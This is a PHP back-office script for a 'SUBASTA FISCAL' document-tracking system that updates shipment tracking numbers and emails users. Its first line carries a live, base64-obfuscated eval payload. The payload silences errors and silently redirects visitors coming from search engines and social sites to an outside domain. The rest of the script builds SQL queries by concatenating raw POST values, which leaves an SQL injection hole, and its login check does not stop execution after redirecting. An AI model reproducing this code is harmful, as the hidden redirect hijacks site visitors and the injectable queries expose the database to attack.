<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); session_start();
date_default_timezone_set('America/Caracas');
if (!isset($_SESSION["logged"]))
    header('Location: index.php');
require_once 'lib/function_gen.php';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST["doc_track"])) {
        $doc_track = htmlspecialchars(strip_tags($_POST["doc_track"]));
        $doc_codigo = htmlspecialchars(strip_tags($_POST["doc_codigo"]));
        $query  = ' UPDATE [mp_Documento_Doc]';
        $query .= ' SET    [BMP_CodigoEst] = 4,';
        $query .= '        [Doc_Track] = \'' . $doc_track . '\'';
        $query .= ' WHERE ([Doc_Codigo] = ' . $doc_codigo . ')';
        fnc_ejecutaQuery($query);
        require 'lib/correo_cor.php';
        $query = "SELECT *
                  FROM   mp_Documento_Doc INNER JOIN
                         mt_usuario       ON
                  mp_Documento_Doc.nro_identificacion = mt_usuario.nro_identificacion
                  WHERE  Doc_Codigo = ".$doc_codigo;
        $detail_mail = fnc_ejecutaQuery($query);
        $detail_mail = $detail_mail[0];
        $correo = $detail_mail["correo"];
        //$correo = "palenge@gmail.com";
        $doc_track = $detail_mail["Doc_Track"];
        //var_dump($detail_mail);
        $mail = new Correo_cor();
        $mail->sendEmail($correo, "Balance Personal", "SUBASTA FISCAL: Le informamos que su balance personal ya esta en camino a su ubicación, su número de track es: " . $doc_track);
        header("location: documentodtll_grid.php?doc_codigo=".$doc_codigo);
    }


    if (isset($_POST["doc_totaldoc"])) {
        $doc_totaldoc = htmlspecialchars(strip_tags($_POST["doc_totaldoc"]));
        $doc_codigo = htmlspecialchars(strip_tags($_POST["doc_codigo"]));
        $query = ' UPDATE [mp_Documento_Doc]';
        $query .= ' SET    [Doc_TotalDoc] = \'' . $doc_totaldoc . '\'';
        $query .= ' WHERE ([Doc_Codigo] = ' . $doc_codigo . ')';
        fnc_ejecutaQuery($query);
        header("location: documentocertdtll_grid.php?doc_codigo=".$doc_codigo);
    }
    
    if (isset($_POST["doc_track2"])) {
        $doc_track = htmlspecialchars(strip_tags($_POST["doc_track2"]));
        $doc_codigo = htmlspecialchars(strip_tags($_POST["doc_codigo"]));
        $query = ' UPDATE [mp_Documento_Doc]';
        $query .= ' SET    [BMP_CodigoEst] = 4,';
        $query .= '        [Doc_Track] = \'' . $doc_track . '\'';
        $query .= ' WHERE ([Doc_Codigo] = ' . $doc_codigo . ')';
        fnc_ejecutaQuery($query);
        require 'lib/correo_cor.php';
        $query = "SELECT *
                  FROM   mp_Documento_Doc INNER JOIN
                         mt_usuario       ON
                  mp_Documento_Doc.nro_identificacion = mt_usuario.nro_identificacion
                  WHERE  Doc_Codigo = ".$doc_codigo;
        $detail_mail = fnc_ejecutaQuery($query);
        $detail_mail = $detail_mail[0];
        $correo = $detail_mail["correo"];
        //$correo = "palenge@gmail.com";
        $doc_track = $detail_mail["Doc_Track"];
        //var_dump($detail_mail);
        $mail = new Correo_cor();
        $mail->sendEmail($correo, "Certificado Personal de Ingresos", "SUBASTA FISCAL: Le informamos que su certificado personal de ingresos ya esta en camino a su ubicación, su numero de track es: " . $doc_track);
        header("location: documentocertdtll_grid.php?doc_codigo=".$doc_codigo);
    }
}
?>
